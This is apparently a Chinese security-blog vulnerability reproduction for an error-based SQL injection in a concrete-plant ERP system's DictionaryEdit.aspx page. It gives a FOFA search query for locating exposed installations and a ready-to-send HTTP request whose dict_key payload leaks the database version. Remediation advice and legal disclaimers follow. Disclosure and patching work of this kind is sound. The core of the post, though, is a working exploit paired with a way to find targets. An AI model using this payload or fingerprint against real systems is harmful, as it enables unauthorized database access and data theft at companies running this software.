#  商混ERP系统 SQL注入漏洞复现   
孔方兄  巢安实验室   2025-01-21 06:30  
  
## 一、漏洞介绍  
## 杭州荷花软件有限公司开发的商混ERP系统。这套系统主要是处理建筑公司或者各项工程的搅拌站管理，内部含有销售模块、生产管理模块、实验室模块、人员管理等，该公司的商品混凝土ERP系统/Sys/DictionaryEdit.aspx处dict_key参数存在SQL报错注入漏洞，攻击者可通过该漏洞获取数据库权限。  
## 二、漏洞影响版本  
  
商混ERP系统  
## 三、FOFA语句  
```
app="商混ERP系统"
```  
## 四、漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxbzl7jZJ6kSk7cFOGFBRcuvsD7AibDD0RCTtC3BKEOqDBgYab4KdqWzzrbX52XIbCiaF9mwNnOzOMQ/640?wx_fmt=png&from=appmsg "")  
```
GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(255),@@version)-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxbzl7jZJ6kSk7cFOGFBRcun1l4UQG2xtE7CTc6VCKkaR8WicicNljdlaqKyibicOvj237DHlfvKwHibpA/640?wx_fmt=png&from=appmsg "")  
  
五、修复建议  
  
  
1、使用预编译语句，所有的查询语句都使用数据库提供的参数化査询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。  
  
2、对进入数据库的特殊字符("@&*;等)进行转义处理，或编码转换,  
  
3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型  
  
4、过滤危险字符，例如:采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。  
  
六、参考链接  
```
https://blog.csdn.net/qq_41904294/article/details/134636414
https://gobysec.net/updates#2023%E5%B9%B4%E7%AC%AC17%E5%91%A8
```  
  
真心感觉自己要学习的知识好多，也有好多大神卧虎藏龙、开源分享。作为初学者，我们可能有差距，不论你之前是什么方向，是什么工作，是什么学历，是大学大专中专，亦或是高中初中，只要你喜欢安全，喜欢渗透，就朝着这个目标去努力吧！有差距不可怕，我们需要的是去缩小差距，去战斗，况且这个学习的历程真的很美，安全真的有意思。但切勿去做坏事，我们需要的是白帽子，是维护我们的网络，安全路上共勉。  
  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
